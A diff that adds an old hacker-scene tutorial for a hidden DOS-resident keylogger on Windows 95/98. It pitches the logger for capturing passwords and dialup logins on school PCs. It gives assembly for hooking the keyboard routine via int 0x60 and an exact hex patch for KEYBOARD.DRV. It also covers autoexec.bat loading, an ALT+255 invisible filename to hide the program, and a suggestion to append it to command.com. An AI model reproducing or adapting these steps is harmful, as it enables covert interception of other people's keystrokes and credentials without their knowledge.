@@ -1,0 +1,134 @@
+((((((((((((((((((((((())))))))))))))))))))))
+(( Keyloging For Winbloz 9x - By CoLdBLood ))
+((((((((((((((((((((((())))))))))))))))))))))
+
+ NOTE: This works on winbloz 95 & 98 - c that little x ?
+
+ A while back I wos feeling the need for a keylogger for my winbloz box so i 
+ decided to code one. The only problem wos that i had no winbloz compilers, so 
+ i booted up pascal and let rip.
+
+ Why do you want a keyboard logger ? For schools pc's... passwords ... internet 
+ dialups... about ANYTHING can be obtained with this method... whole essays... 
+ papers... *whistles* :)
+
+ Now it may sound weird if i tell you this keylogger works in DOS and logs 
+ winbloz keys right ? well not really if you think about it, for example 
+ Himem.sys and Emm386.exe work very nicely in the background of windbloz so why 
+ cant we have a keylogger sharing the fun ?
+
+ If you dont want to know how it works then go strait to point 6
+
+(((((((((((((((()))))))))))))))))
+(( How it works / How to do it ))
+(((((((((((((((()))))))))))))))))
+   
+ Well i dont wont to waist time on explaining every little freaking
+ detail on how i figured it out so ill get straight to the point.
+
+ 1. Winbloz has files called .DRV files which are Device drivers. On my quest to 
+    writing this app i found that this is winbloz answer to interrupts - instead
+    of using interrupts it only calls int 0x30 which contains code that executes
+    the correct code from these files. The file thats of intrest to us is the 
+    KEYBOARD.DRV file.
+
+ 2. Now this basicly means that our normal int's like int 0x15 (keyboard) wont be 
+    of mutch help in winbloz... but we do know now, how and where winbloz uses 
+    the code for its keyboard...
+
+ 3. We need a plan here... We need too hook our little TSR (Terminate and Stay 
+    Resident) proggie sothat it gets called everytime a key is pressed and then 
+    our proggie can log... Hmm if winbloz doesnt call any other int's except 
+    int 0x30 how the hell can we get the OS to call our little TSR ???
+
+ 4. We can try to debug int 0x30 but ill rather go to hell before i go through 
+    such "l33t" red tape. Lets boot up soft-ice (The best tool there is for 
+    debugging and cracking softwear in REAL time while the CPU is executing the 
+    code) and see what we can find out about the keyboard activities in winbloz...
+
+ 5. First thing we will need to do is set up a break point on the keyboard port
+    (port 0x60) ... ok break point set now we just switch back to winbloz and 
+    press a key... Violla ... whot is this ? looks like we have landed smack bang
+    in the middle of THE procedure winbloz uses EACH time u press a key... and 
+    it look like this:
+
+	mov	ax,0040
+	mov	es,ax
+	in	al,60           ; this is whot cuased the brake, this 
+	mov	ah,es:[0017]	; reads from port 0x60
+	cmp	al,f0
+	
+    yeah know thats very kewl but whot does this mean ? Well this means if we can
+    hook a interrupt at bootup whitout winbloz moaning about it we can MODIFY 
+    this WINBLOZ code to call our INT ! and yes i said modify and winbloz code 
+    in the same sentence. Now what int can we use ? any of you know that int 0x60
+    is an int that never gets used ? not even winbloz uses it so this makes it 
+    perfect for too hook at runtime... Now to modify the code... the point here 
+    is for the code to STILL DO EXACTLY the same thing BUT it MUST also call our 
+    int 0x60. Lets take a look at the code again:
+
+	mov	ax,0040        ; 
+	mov	es,ax          ; 
+	in	al,60          ; if we can put our call to int 0x60 right after
+	mov	ah,es:[0017]   ; this would be ideal becoz it means winbloz does
+	cmp	al,f0	       ; the work for us and we get EXACTLY whot winbloz
+			       ; gets NEAT!
+
+    now the problem is we need to insert code - which means we need to get crafty
+    for a int call we only need to free up 2 bytes and we are in sooo...
+
+        mov     ax,0040        ; this is 3 bytes big
+        mov     es,ax          ; 2 byes big
+
+    did i say we need 2 bytes ? viola
+
+        mov	ax,0040        ; replace with  - push 40 - which is 2 bytes big
+        mov     es,ax          ; replace with  - pop  es - which is 1 byte big
+
+    this as exactly the same effect just 2 bytes smaller ! how much we need ? 2!
+    so now we replace the code and insert our call to int 0x60 and viola we are 
+    set !
+       
+	push	40
+	pop	es
+	in	al,60
+	int	60                 ; new code added whitout effecting the code -
+	mov	ah,es:[0017]       ; notice that the call is after the in al,60 ?
+	cmp	al,f0
+
+
+ 6. There we go now all you have to do is make a copy of KEYBOARD.DRV (which is in
+    your C:\windows\system dirctory) ex. KEYBOARD.DED and load the copy up in your 
+    hex-editor and search for the
+    following		: b840008ec0e460
+    and replace it with : 6a4007e460cd60
+    Then open a dos box and type: edit C:\autoexec.bat
+    now on the first line hit enter sothat a blank line apears at the top of the
+    file. Now hold down the ALT key and hit 255 on the key pad and then let the
+    alt key go. A blank space should apear... if it doesnt, keep on doing it until
+    you get a blank space... if you do get a blank space hit alt+f and press s
+    to save. Now copy the keylog.exe file to your windows\system directory and
+    ([ALT+255] means hold down alt and hit 255 on the keypad and let go of ALT)
+    then type: ren keylog.exe [ALT+255].exe
+    Then go back to winbloz and select SHUTDOWN / RESTART in DOS mode. When you
+    are in REAL dos mode go to the winbloz\system directory and make a nother 
+    backup of the KEYBOARD.DRV file then copy the backup file that u patched over
+    the the KEYBOARD.DRV file then simply reboot. All keys will be logged to the
+    windows\system directory in a file called KEYB.LOG
+
+    NOTE: If you patched and replaced the keyboard.drv file to call INT 0x60 and 
+          the keylogger is not loaded at boot time your winbloz box will crash 
+          every time you press a key! Hope u know why this happens...
+
+    Now i know most of u are saying LAMER method man but hey the source is there
+    all you have to do is make it append it self to the command.com or sumthing
+    similiar... Anyhowz a nother neat thing is the only why you can c this proggy
+    in action is if you go into a dos box and type: /mem /c/p
+    you will see somthing really weird... in the list of all the programs there 
+    will be a name  "---------"  apperantly mem uses the alt+255 code to make its
+    menus with - how confieniant :)
+    i HAVENT seen winbloz pick this up in anyway yet so its totaly invisible
+ 
+    So have phun kidz
+
+    Greetz: Depach & Jamie for the phile support
